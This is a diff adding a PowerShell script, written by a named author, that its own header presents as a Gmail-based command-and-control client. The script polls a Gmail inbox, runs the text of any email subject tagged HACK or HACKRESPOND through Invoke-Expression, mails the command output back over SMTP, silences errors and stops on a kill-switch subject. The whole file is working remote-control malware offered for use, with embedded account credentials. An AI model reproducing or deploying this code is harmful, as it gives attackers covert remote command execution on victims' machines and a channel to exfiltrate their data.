@@ -1,0 +1,73 @@
+####################################################
+#      GMail-based command and control client      #
+# Reads your gmail account, checks unread emails,  #
+# and executes commands based on the subject.      #
+# Requires you to have a per-app password set for  #
+# gmail.                                           #
+#                                                  #
+# Subject HACK:something will execute blind        #
+# Subject HACKRESPOND;something will execute and   #
+# return the output in an email.                   #
+#                                                  #
+#         Written by Andreas Aaris-Larsen          #
+####################################################
+
+$ErrorActionPreference='silentlycontinue';
+
+
+
+$username = "yourthrowawayaccount@gmail.com"                 #The gmail account to use
+
+$password = "yhbasdvujnikm"                      #Per-app password for the account
+
+$Interval = 10                                      #Interval with which to check for commands
+
+$Killswitch = "KILL"                                #Killswitch. Set the subject of your email to "KILL:something"
+                                                    # to terminate the client
+
+
+$webclient = new-object System.Net.WebClient
+$webclient.Credentials = new-object System.Net.NetworkCredential ($username,$password)
+
+While($true)
+{
+    [xml]$xml= $webclient.DownloadString("https://mail.google.com/mail/feed/atom")
+
+    ForEach($message in $xml.feed.entry)
+    {
+        $string = $message.title
+        if($string.Split(":")[0] -ceq "HACK")                                          #Executes blindly
+        {
+            Write-Host -NoNewline "Command received:" $string.Split(":")[1]
+            $Output = (Invoke-Expression($string.Split(":")[1]) | Format-Table | Out-String)
+            Write-Host "... Executed:"
+            $Output
+        }
+        elseif($string.Split(":")[0] -ceq "HACKRESPOND")                               #Executes and returns the command output in an email with the subject "HACKREPLY"
+        {
+            Write-Host -NoNewline "Command received:" $string.Split(":")[1]
+            $Output = (Invoke-Expression($string.Split(":")[1]) | Format-Table | Out-String)
+            Write-Host "... Executed:"
+            Write-Host "Sending reply...."
+            $EmailFrom = $username
+            $EmailTo = $username 
+            $Subject = "HACKREPLY" 
+            $Body = $Output 
+            $SMTPServer = "smtp.gmail.com" 
+            $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+            $SMTPClient.EnableSsl = $true 
+            $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($username, $password); 
+            $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
+            Write-Host "Reply sent"
+        }
+        if(([string]$string.Split(":")[0]).Trim() -ceq $Killswitch)                     # Terminates the client
+        { 
+            Exit
+        }
+
+    }
+    Start-Sleep -Second $Interval
+}
+
+
+
